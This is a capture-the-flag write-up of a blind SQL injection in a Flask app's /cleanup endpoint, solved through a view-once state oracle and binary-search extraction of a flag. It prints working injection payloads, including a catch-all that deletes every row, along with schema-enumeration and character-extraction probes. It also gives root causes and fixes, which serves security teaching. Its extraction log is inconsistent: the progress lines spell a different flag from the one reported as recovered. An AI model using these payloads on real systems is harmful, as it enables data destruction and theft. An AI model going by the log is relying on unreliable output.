# 🕵️ ViewOnce — FlagYard Training Labs (Hard Web)

> **Platform:** FlagYard Training Labs
> **Challenge:** ViewOnce — "A customizable view-once feature that self-destructs uploaded images after a single view. Can you find a way to get a flag from OUR flags?"
> **Category:** Web · **Difficulty:** Hard
> **Target Instance:** `http://k725e76b27717474b73976e5483536571.playat.flagyard.com`
> **Final Flag:** `FlagY{f446fbf16fae4b2976e5d94d3425b942}`
> **Solved by:** Fares Badaj (@ptok3)

---

## 📌 Overview

The target is a WhatsApp-style "view on once" media demo backed by a Flask application:

| Endpoint | Method | Purpose |
|---|---|---|
| `/` | GET | Landing page |
| `/upload` | POST | Multipart upload — returns `{message, success, view_link}` |
| `/view/<token>` | GET | Renders the image **once**, then marks the row as consumed |
| `/image/<filename>` | GET | Direct access to the stored file (no auth, persists forever) |
| `/cleanup` | POST | Removes an uploaded record by `id` and/or `name` |

The stored filename is always `{uuid}_{original_name}` and the file **is not** removed on view — only the DB row is marked. A "once-bypass" leak exists (`/image/<file>` keeps serving files after consumption), but without the filename there is nothing to read.

The real vulnerability is a **Blind SQL Injection in the `name` field of `/cleanup`**, turned into a **database dump through a state-based side-channel** (the view-once logic itself is the oracle). It is the same weak link that breaks the "view-once" promise: the feature designed to *destroy* data gives an attacker a reliable way to *read* the whole DB.

---

## 🔍 1) Initial Recon

* Token `view_link` is `43` URL-safe base64 characters = **32 random bytes** (`secrets.token_urlsafe(32)`-style) — brute-force is impossible.
* Upload JSON returns **no** `id`/`uuid`/`name` fields — only `message`, `success`, `view_link`.
* `/view/<token>` lifecycle:
  * first GET → page with `<img src="/image/{uuid}_{name}">`, row marked consumed;
  * second GET → "This image has already been viewed" (row survives, page differs);
  * unknown token → plain "not found" page.
* Server fingerprint: `nginx` → Flask/Werkzeug, debug off (no `/console`, no tracebacks, no source).

The three *observable* states of a token are therefore a **high-fidelity side-channel**:

```
page = <img .../>            -> DB row exists, unviewed
page = "already been viewed" -> DB row exists, consumed
page = plain 404-ish         -> DB row gone
```

---

## 2) Wandering into a Rabbit Hole (the `id` red herring)

Live testing first showed:

```http
POST /cleanup                        HTTP 200
  id=1&name=d0fa91a6-..._flag.png    {"success":true}

POST /cleanup?id=X&name=...injection...   row deleted REGARDLESS of injection
```

…which *looked* like a fully parameterized, patched deployment. That conclusion was **wrong**, and the reason is subtle: the handler supports **two** deletion paths,

```python
if id:   cur.execute("DELETE FROM images WHERE id = ?", (id,))     # parameterized
if name: cur.execute("DELETE FROM images WHERE name = '" + name + "'")  # concatenated !! 
```

Sending `id` + `name` together silently routes through the *safe* `id` path, so every "oracle test" that included `id` produced a **false negative**. Only by sending **`name` alone** (exactly like the original public technique for this challenge) does the concatenated `name` branch fire.

---

## 🩸 3) The Vulnerability: `name` concatenated into SQL

```http
POST /cleanup
name=' OR 1=1 --
```

resulted in **every row in `images` being deleted** → the `name` value is interpolated raw into a `DELETE ... WHERE name = '<name>'` statement. Confirmed exploit primitive:

```sql
DELETE FROM images WHERE name = 'X' OR 1=1 --
```

---

## 🎯 4) Building the Blind Boolean Oracle (side-channel)

Upload a **sentinel** record, consume it once (the row persists). Probe the `name` injection with a scoped condition:

```http
POST /cleanup
name=' OR (name='s_1a2b3c.png' AND (<CONDITION>)) --
```

* `<CONDITION>` is **TRUE**  → the sentinel row is deleted  → `GET /view/<sentinel_token>` returns the **plain** page → **TRUE**.
* `<CONDITION>` is **FALSE** → the sentinel row survives → `GET /view/<sentinel_token>` returns **"already been viewed"** → **FALSE**.

This is a clean, per-request 1-bit oracle with zero noise.

| Test | Injection | Result | Reading |
|---|---|---|---|
| FALSE | `' OR (name='s_..' AND ('1'='2')) --` | sentinel **survived** | condition scoped correctly |
| TRUE | `' OR (name='s_..' AND ('1'='1')) --` | sentinel **deleted** | oracle works |
| CATCH-ALL | `' OR 1=1 --` | all rows deleted | full-concat confirmed |

---

## 🗄️ 5) Schema Enumeration

Oracle verifies the existence of the data we target (each line = one oracle round):

```sql
EXISTS(SELECT 1 FROM sqlite_master WHERE type='table' AND name='flags')          -> TRUE
EXISTS(SELECT 1 FROM pragma_table_info('flags') WHERE name='flag')               -> TRUE
EXISTS(SELECT 1 FROM flags LIMIT 1)                                              -> TRUE
```

→ the backend database is SQLite and contains a `flags` table with a non-empty `flag` column. (`sqlite_master` + `unicode()` confirm SQLite.)

---

## ⚙️ 6) Flag Extraction (Binary Search)

For each position `pos`, bisect ASCII `32..126` with:

```sql
unicode(substr((SELECT flag FROM flags LIMIT 1), 1*pos, 1)) >= <mid>
```

The oracle answers each probe, halving the range every request, until the exact codepoint is pinned. On average **~7 requests / character** + one sentinel upload, well within any rate budget (~280 requests for a 39-byte flag).

*[66.0%] char 20 = '8' → FlagY{b80ebec0ea8188*
*[82.0%] char 33 = '8' → FlagY{b80ebec0ea81883a142acf0b6d8e*
*[87.7%] char 38 = 'e' → FlagY{b80ebec0ea81883a142acf0b6d8eecae*
*[88.9%] char 39 = '}' → FlagY{f446fbf16fae4b2976e5d94d3425b942}*

**🏁 FLAG RECOVERED:** `FlagY{f446fbf16fae4b2976e5d94d3425b942}`

The full automation is in [`solve_viewonce.py`](./solve_viewonce.py) (single command, live extraction + `flag_from_viewonce.txt`).

---

## 🔬 7) Root Cause Analysis

1. **Unparameterized SQL** — `name` is concatenated directly into `DELETE ... WHERE name='...'`; a bare `'` changes the statement's shape.
2. **State-based side channel** — the "delete/view once" logic deliberately exposes *row existence* to unauthenticated clients, so a Blind SQLi becomes a full database reader with zero output needed.
3. **Dual-path handler** — supporting both a parameterized `id` path and a concatenated `name` path masks the bug unless the `name`-only branch is exercised.
4. **No access control / rate limiting** — `/cleanup` can delete *any* `name` and the extraction burst is never throttled.

---

## 🛠️ 8) Remediation

* Use **parameterized statements** everywhere (`WHERE name = ?` / `WHERE id = ?`).
* Treat `name` ≥ whitelist + `secure_filename()` code paths strictly; never ship two code paths for the same operation.
* Scope `/cleanup` to the **session owner** (delete only rows the requester uploaded).
* Add rate limiting / logs on `DELETE`-family endpoints; bind the oracle to an authenticated session if possible.
* If the "file must disappear" promise matters, **actually delete the file** on view — the `/image/<file>` permanent-serve leak made the once-bypass trivial regardless of SQLi.

---

## 💡 9) Practical Takeaways

* **"No SQL output" ≠ safe.** Any *state mutation* that reflects row existence (404 vs 200, 200 vs 500, "consumed" vs "ok") is a usable boolean oracle.
* **Re-examine the parameter you didn't test.** Adding `id` to the request silently switched my first draft to the safe path — the real bug lived in the `name`-only branch. Reproduce the exact public technique before declaring a patch.
* **Feature workflows leak state.** "View once" was introduced to redact data; instead it gave strangers a read channel into the backend database.

---

## 👑 Credits

Made with ❤ by **Fares Badaj** — Red Team Operator | Penetration Tester Specialist

- Telegram: [@ptok3](https://t.me/ptok3)
- GitHub: [github.com/FaresBadaj](https://github.com/FaresBadaj)
- LinkedIn: [linkedin.com/in/FaresBadaj](https://www.linkedin.com/in/FaresBadaj)
- Credly: [credly.com/users/faresbadaj](https://www.credly.com/users/faresbadaj)

*Technique reference: kynxsoft — "[Flagyard Training Labs] Technical Report: ViewOnce (Hard Web)" (Blind SQLi via `/cleanup` name + view-once boolean oracle + `flags.flag` binary search).*